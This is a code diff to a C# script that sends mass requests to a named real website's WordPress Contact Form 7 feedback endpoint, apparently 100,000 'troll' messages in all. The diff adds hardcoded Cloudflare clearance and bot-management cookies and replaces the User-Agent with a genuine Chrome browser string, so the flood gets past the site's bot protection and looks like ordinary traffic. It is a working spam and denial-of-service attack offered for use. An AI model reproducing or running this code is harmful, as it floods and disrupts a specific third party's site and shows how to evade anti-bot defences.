@@ -1,8 +1,33 @@
-﻿string url = "https://josiohannis.ro/wp-json/contact-form-7/v1/contact-forms/189/feedback";
+﻿using System.Net;
+
+string url = "https://josiohannis.ro/wp-json/contact-form-7/v1/contact-forms/189/feedback";
 int tasksPerBulkCount = 100;
 int bulksCount = 1000;
-HttpClient client = new HttpClient();
+CookieContainer cookieContainer = new CookieContainer();
 
+
+cookieContainer.Add(new Cookie()
+{
+    Name = "__cf_bm",
+    Value = "MvHZesnCNwO3E8bddlssajtUeuAUgToHF6cLFVdYTuc-1652873009-0-AQtSbd8TRtNNhB6GtD9fkScTkzDjxF3uMXFvxHZaJGsvUvCT33uqmvlqL6gC0xAGS3Qfyrqz/eCwHgvMx+myOkjTQlvXRuhwQg1ZIT0L09A+1C5V6XQvqNLcrhlGDA2P7g==",
+    Domain = "josiohannis.ro",
+    Path = "/",
+    Expires = DateTime.Now.AddYears(2)
+});
+
+cookieContainer.Add(new Cookie()
+{
+    Name = "cf_clearance",
+    Value = "ZSzz47tkp3IqIx4o7oyA8Eet1wOyADqAg1Km.Tua1bg-1652873004-0-150",
+    Domain = "josiohannis.ro",
+    Path = "/",
+    Expires = DateTime.Now.AddYears(2)
+});
+
+
+using var handler = new HttpClientHandler() { CookieContainer = cookieContainer };
+using var client = new HttpClient(handler);
+ 
 for (int i = 0; i < bulksCount; i++)
 {
     Console.WriteLine($"Bulk ----------------------------------{i}--------------------------------------");
@@ -46,8 +71,8 @@ for (int i = 0; i < bulksCount; i++)
 
 
            trollMessage.Content = messageContent;
-           trollMessage.Headers.Add("User-Agent", "Not every agent can be trust");
-
+           trollMessage.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36");
+            
 
            var response = client.Send(trollMessage);
 
